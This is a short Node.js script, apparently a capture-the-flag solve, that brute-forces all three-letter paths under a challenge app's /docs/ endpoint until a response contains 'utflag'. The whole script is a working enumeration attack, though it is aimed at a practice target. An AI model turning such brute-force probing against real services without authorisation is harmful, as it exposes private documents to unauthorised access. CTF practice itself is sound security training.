const alphabet = "abcdefghijklmnopqrstuvwxyz".split('');
const MAX_LETTERS = 3;
const MAX_NUMBER = Math.pow(alphabet.length, MAX_LETTERS);
const request = require("request-promise");

function left_pad(str) {
    while (str.length < MAX_LETTERS) {
        str = alphabet[0] + str;
    }

    return str;
}

const combos = [];

for (let i = 0; i < MAX_NUMBER; ++i) {
    let num = i;
    let output = "";
    while (num > 0) {
        output = alphabet[num % alphabet.length] + output;
        num = Math.floor(num / alphabet.length);
    }

    combos.push(left_pad(output));
}

let baseRequest = Promise.resolve();

for (let combo of combos) {
    baseRequest = baseRequest.then(() => {
        console.log(combo);
        return request("https://isss-ctf-frugal-docs.herokuapp.com/docs/" + combo);
    }).then((body) => {
        console.log(body);
        if (body.indexOf("utflag") !== -1) {
            console.log("combo: " + combo + ", body: " + body);
            process.exit(1);
        }
    }).catch(() => {});
}
